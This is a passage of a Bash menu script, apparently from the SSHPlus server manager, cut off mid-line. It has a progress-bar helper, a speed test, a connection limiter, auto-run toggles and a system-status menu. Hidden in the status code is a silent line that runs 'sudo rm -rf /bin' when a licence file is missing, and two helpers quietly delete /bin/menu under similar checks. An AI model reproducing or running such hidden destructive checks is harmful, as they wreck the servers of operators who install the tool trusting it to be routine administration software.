#!/bin/bash
fun_bar () {
command[0]="$1"
command[1]="$2"
 (
[[ -e $HOME/fim ]] && sudo rm $HOME/fim
[[ ! -e /usr/lib/sshplus ]] && sudo rm -rf /bin/menu > /dev/null 2>&1
${command[0]} -y > /dev/null 2>&1
${command[1]} -y > /dev/null 2>&1
sudo touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && sudo rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
menu ()
{
velocity () {
wait () {
command[0]="$1"
command[1]="$2"
 (
[[ -e $HOME/fim ]] && sudo rm $HOME/fim
[[ ! -d /etc/SSHPlus ]] && sudo rm -rf /bin/menu
${command[0]} > /dev/null 2>&1
${command[1]} > /dev/null 2>&1
sudo touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  \033[1;33mWAIT \033[1;37m- \033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && sudo rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  \033[1;33mWAIT \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
fun_tst () {
sudo speedtest --share > speed
}
echo ""
echo -e "   \033[1;32mTESTING SERVER SPEED !\033[0m"
echo ""
wait 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mPING (LATENCY):\033[1;37m$png"
echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sudo rm -rf $HOME/speed
}
#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mSTARTING THE LIMITER... \033[0m"
   echo ""
   fun_bar 'sudo screen -dmS limiter limiter' 'sudo sleep 3'
   [[ $(sudo grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "sudo ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || sudo screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sudo sed -i '/limiter/d' /etc/autostart
	   echo -e "sudo ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || sudo screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32m  ACTIVE LIMITER !\033[0m"
   sleep 3
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;32mSTOPPING THE LIMITER... \033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1
      sudo screen -r -S "limiter" -X quit
      sudo screen -wipe 1>/dev/null 2>/dev/null
      [[ $(sudo grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sudo sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sudo sleep 3'
   echo -e "\n\033[1;31m STOP LIMIT !\033[0m"
   sleep 3
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

function autoexec () {
   if sudo grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;32mDISABLING AUTO RUN\033[0m"
      offautmenu () {
         sudo sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mAUTO EXECUTION OFF!\033[0m"
      sleep 1.5s
      menu2
   else
      clear
      echo -e "\033[1;32mACTIVATING AUTO RUN\033[0m"
      autmenu () {
         sudo grep -v "^menu;" /etc/profile > /tmp/tmpass && sudo mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mAUTO RUN ON!\033[0m"
      sleep 1.5s
      menu2
   fi

}
#menu2
menu2 (){
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(sudo ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
autm=$(sudo grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && sudo rm -rf /bin > /dev/null 2>&1
if [[ "$(sudo grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(sudo cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(sudo cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(sudo grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(sudo cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(sudo cut -d' ' -f3 /etc/issue.net)
else
system=$(sudo cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(sudo ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(sudo cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(sudo cat /etc/SSHPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(sudo grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(sudo ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(sudo free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(sudo free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(sudo top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(sudo grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(sudo awk -F: '$3>=1000 {print $1}' /etc/passwd | sudo grep -v nobody | wc -l)
clear
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[41;1;37m               ⇱ SSHPLUS MANAGER ⇲                \E[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mSYSTEM            RAM MEMORY      PROCESSOR "
echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mCPU: \033[1;37m$_core\033[0m"
echo -e "\033[1;31mHour: \033[1;37m$_hora     \033[1;31mIn use: \033[1;37m$_usor \033[1;31mIn use: \033[1;37m$_usop\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
[[ ! -e /tmp/att ]]  && {
    echo -e "\033[1;32mOnline:\033[1;37m $_onlin     \033[1;31mExpired: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
    var01='\033[1;37m•'
} || {
    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mTHERE IS A UPDATE AVAILABLE  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
    var01="\033[1;32m!"
}
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -e "\033[1;31m[\033[1;36m20\033[1;31m] \033[1;37m• \033[1;33mADD HOST \033[1;31m             [\033[1;36m26\033[1;31m] \033[1;37m• \033[1;33mCHANGE ROOT PASSWORD \033[1;31m
[\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mREMOVE HOST \033[1;31m          [\033[1;36m27\033[1;31m] \033[1;37m• \033[1;33mMAIN EXECUTION $autm \033[1;31m
[\033[1;36m22\033[1;31m] \033[1;37m• \033[1;33mRESET SYSTEM \033[1;31m         [\033[1;36m28\033[1;31m] $var01 \033[1;33mUPDATE SCRIPT \033[1;31m
[\033[1;36m23\033[1;31m] \033[1;37m• \033[1;33mRESET SERVICES \033[1;31m       [\033[1;36m29\033[1;31m] \033[1;37m• \033[1;33mREMOVE SCRIPT \033[1;31m
[\033[1;36m24\033[1;31m] \033[1;37m• \033[1;33mBLOCK TORRENT $stsf\033[1;31m      [\033[1;36m30\033[1;31m] \033[1;37m• \033[1;33mBACK \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m
[\033[1;36m25\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot\033[1;31m       [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mEXIT \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m"
echo ""
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
